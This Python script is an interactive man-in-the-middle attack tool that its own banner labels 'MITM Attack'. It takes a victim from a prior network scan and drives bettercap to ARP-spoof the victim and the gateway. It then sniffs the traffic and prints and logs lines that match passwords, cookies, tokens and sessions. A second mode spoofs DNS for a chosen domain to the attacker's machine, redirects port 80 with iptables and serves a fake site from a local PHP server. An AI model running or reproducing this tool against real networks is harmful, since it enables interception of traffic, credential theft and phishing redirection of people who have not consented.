import json
import os
import subprocess
import signal
import netifaces
from pathlib import Path
import sys
import select
import threading
import time

def get_gateway_ip():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][0]
    return None

def get_iface_ip(iface):
    try:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            return addrs[netifaces.AF_INET][0].get('addr')
    except:
        pass
    return None

def load_hosts(json_file: str):
    with open(json_file, "r") as f:
        data = json.load(f)

    hosts = []
    if data.get("hosts"):
        for host in data.get("hosts", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))
    elif data.get("scan_parsed"):
        for host in data.get("scan_parsed", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))

    return hosts, data

def delete_scan_files(prefix: Path):
    prefix = prefix.with_suffix("") 
    suffixes = [".json"]
    for suf in suffixes:
        f = Path(str(prefix) + suf)
        if f.exists():
            try:
                os.remove(f)
            except Exception:
                pass

def show_menu():
    print("\n" + "=" * 50)
    print(" MITM Attack ")
    print("=" * 50)
    print("1. ARP Spoofing")
    print("2. DNS Spoofing")
    print("3. Exit")

def output_reader(proc, stop_event, show_output, log_file, target_ip):
    important_keywords = [
        'http.request', 'https.request', 'dns.request',
        'credentials', 'password', 'login', 'user', 'auth',
        'cookie', 'session', 'token', 'POST', 'GET',
        'sniff.', 'arp.spoof'
    ]
    
    while not stop_event.is_set():
        try:
            if proc.stdout:
                line = proc.stdout.readline()
                if line:
                    stripped = line.strip()
                    if stripped and show_output.is_set():
                        log_file.write(stripped + "\n")
                        log_file.flush()
                        
                        if any(kw.lower() in stripped.lower() for kw in important_keywords):
                            print(f"  {stripped}", flush=True)
                elif proc.poll() is not None:
                    break
        except:
            break

def output_reader_dns(proc, stop_event, show_output):
    while not stop_event.is_set():
        try:
            if proc.stdout:
                line = proc.stdout.readline()
                if line:
                    stripped = line.strip()
                    if stripped and show_output.is_set():
                        if 'dns.spoof' in stripped or 'spoofed' in stripped.lower() or 'sending' in stripped.lower():
                            print(f"  {stripped}", flush=True)
                elif proc.poll() is not None:
                    break
        except:
            break

def send_command(proc, cmd, delay=0.5):
    try:
        proc.stdin.write(cmd + "\n")
        proc.stdin.flush()
        time.sleep(delay)
    except:
        pass

def run_bettercap(iface="wlan0", target_ip=None, gateway_ip=None):
    cmd = ["bettercap", "-iface", iface]
    
    log_filename = f"{target_ip.replace('.', '_')}_capture.txt"
    log_file = open(log_filename, "w")
    log_file.write(f"Bettercap capture log for {target_ip}\n")
    log_file.write(f"Interface: {iface}\n")
    log_file.write(f"Gateway: {gateway_ip}\n")
    log_file.write("=" * 50 + "\n\n")
    
    print(f"Starting Bettercap on {iface}...")
    print(f"Target: {target_ip}")
    print(f"Gateway: {gateway_ip}")
    print(f"Log file: {log_filename}")
    
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    stop_event = threading.Event()
    show_output = threading.Event() 
    output_thread = threading.Thread(target=output_reader, args=(proc, stop_event, show_output, log_file, target_ip), daemon=True)
    output_thread.start()
    
    print("Initializing...")
    time.sleep(2)
    
    print("Probing network...")
    send_command(proc, "net.probe on", delay=3)
    
    print("Configuring ARP spoof...")
    send_command(proc, f"set arp.spoof.targets {target_ip}", delay=0.3)
    if gateway_ip:
        send_command(proc, f"set arp.spoof.gateway {gateway_ip}", delay=0.3)
    send_command(proc, "set arp.spoof.fullduplex true", delay=0.3)
    
    print("\n" + "=" * 50)
    print(" ARP SPOOFING + SNIFFING ACTIVE")
    print("=" * 50)
    
    show_output.set()  

    send_command(proc, "arp.spoof on", delay=0.5)
    send_command(proc, "net.sniff on", delay=0.5)
    
    print("Press Enter to stop...")
    
    try:
        while proc.poll() is None:
            rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
            if rlist:
                sys.stdin.readline()
                break
    except KeyboardInterrupt:
        pass
    
    show_output.clear()
    print("\nStopping attack...")
    send_command(proc, "arp.spoof off", delay=0.1)
    send_command(proc, "net.sniff off", delay=0.1)
    send_command(proc, "net.probe off", delay=0.1)
    send_command(proc, "exit", delay=0.1)
    
    stop_event.set()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.terminate()
        proc.wait(timeout=2)
    
    log_file.close()
    print(f"Attack stopped successfully")
    print(f"Full output saved to: {log_filename}")


def run_dns_spoof(iface="wlan0", target_ip=None, gateway_ip=None, spoof_domain=None, my_ip=None):
    cmd = ["bettercap", "-iface", iface]
    
    print(f"Starting Bettercap on {iface}...")
    print(f"Target: {target_ip}")
    print(f"Gateway: {gateway_ip}")
    print(f"Spoofing domain: {spoof_domain} -> {my_ip}")
    
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    stop_event = threading.Event()
    show_output = threading.Event()
    output_thread = threading.Thread(target=output_reader_dns, args=(proc, stop_event, show_output), daemon=True)
    output_thread.start()
    
    print("Initializing...")
    time.sleep(2)
    
    print("Probing network...")
    send_command(proc, "net.probe on", delay=3)
    
    print("Configuring ARP spoof...")
    send_command(proc, f"set arp.spoof.targets {target_ip}", delay=0.3)
    if gateway_ip:
        send_command(proc, f"set arp.spoof.gateway {gateway_ip}", delay=0.3)
    send_command(proc, "set arp.spoof.fullduplex true", delay=0.3)
    send_command(proc, "arp.spoof on", delay=0.5)
    
    print("Configuring DNS spoof...")
    send_command(proc, f"set dns.spoof.domains {spoof_domain}", delay=0.3)
    send_command(proc, f"set dns.spoof.address {my_ip}", delay=0.3)
    send_command(proc, "dns.spoof on", delay=0.5)
    
    print("\n" + "=" * 50)
    print(" ARP SPOOFING + DNS SPOOFING ACTIVE")
    print("=" * 50)
    
    show_output.set()
    
    print("Press Enter to stop...")
    
    try:
        while proc.poll() is None:
            rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
            if rlist:
                sys.stdin.readline()
                break
    except KeyboardInterrupt:
        pass
    
    show_output.clear()
    print("\nStopping attack...")
    send_command(proc, "dns.spoof off", delay=0.1)
    send_command(proc, "arp.spoof off", delay=0.1)
    send_command(proc, "net.probe off", delay=0.1)
    send_command(proc, "exit", delay=0.1)
    
    stop_event.set()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.terminate()
        proc.wait(timeout=2)
    
    print("Attack stopped successfully")


def start_php_server(webroot, port=8000):
    print(f"[*] Starting PHP Server on port {port}...")
    subprocess.Popen(
        f"cd {webroot} && xterm -hold -e php -S 0.0.0.0:{port} &",
        shell=True
    )
    time.sleep(2)
    print(f"[+] PHP Server listening on 0.0.0.0:{port}")


def add_iptables_redirect(from_port=80, to_port=8000):
    cmd = ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", 
           "--dport", str(from_port), "-j", "REDIRECT", "--to-port", str(to_port)]
    subprocess.run(cmd, check=False)


def remove_iptables_redirect(from_port=80, to_port=8000):
    cmd = ["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp",
           "--dport", str(from_port), "-j", "REDIRECT", "--to-port", str(to_port)]
    subprocess.run(cmd, check=False)


def kill_php_xterm():
    print("[*] Stopping PHP server...")
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'xterm' in line and 'php' in line:
                parts = line.split()
                if len(parts) > 1:
                    pid = parts[1]
                    try:
                        os.kill(int(pid), signal.SIGKILL)
                    except (ProcessLookupError, ValueError):
                        pass
    except Exception as e:
        print(f"[!] Error killing PHP xterm: {e}")


def main():
   
    try:
        hosts, data = load_hosts("scan_result.json")
    except FileNotFoundError:
        print("Error: scan_result.json not found. Run a scan first.")
        return
    except json.JSONDecodeError:
        print("Error: Invalid JSON in scan_result.json")
        return

    if not hosts:
        print("No hosts found in scan results.")
        return

    default_iface = data.get("iface", "wlan0")
    gateway_ip = get_gateway_ip()

    print("Hosts discovered:")
    for i, (ip, mac) in enumerate(hosts, 1):
        print(f"{i}. IP: {ip}, MAC: {mac}")

    while True:
        try:
            choice = int(input("Select the host to attack (number): "))
            if 1 <= choice <= len(hosts):
                break
            print(f"Choose a number between 1 and {len(hosts)}.")
        except ValueError:
            print("Enter a valid number.")

    target_ip = hosts[choice-1][0]
    target_mac = hosts[choice-1][1]
    
    print(f"Target: {target_ip} ({target_mac})")

    while True:
        show_menu()
        opt = input("Choose an option: ")
        if opt == "1":
            run_bettercap(iface=default_iface, target_ip=target_ip, gateway_ip=gateway_ip)
        elif opt == "2":
            my_ip = get_iface_ip(default_iface)
            if not my_ip:
                print("Error: Could not get IP address for interface.")
                continue
            
            spoof_domain = "example.com"
            
            webroot = Path(__file__).parent / "dns_spoof_site"
            webroot.mkdir(exist_ok=True)
            
            print("[*] Adding iptables redirect rule (80 -> 8000)...")
            add_iptables_redirect(from_port=80, to_port=8000)
            
            start_php_server(str(webroot), port=8000)
            
            try:
                run_dns_spoof(
                    iface=default_iface,
                    target_ip=target_ip,
                    gateway_ip=gateway_ip,
                    spoof_domain=spoof_domain,
                    my_ip=my_ip
                )
            finally:
                kill_php_xterm()
                
                print("[*] Removing iptables redirect rule...")
                remove_iptables_redirect(from_port=80, to_port=8000)
                    
        elif opt == "3":
            print("Exiting...")
            break
        else:
            print("Invalid option. Please choose 1, 2 or 3.")

if __name__ == "__main__":
    main()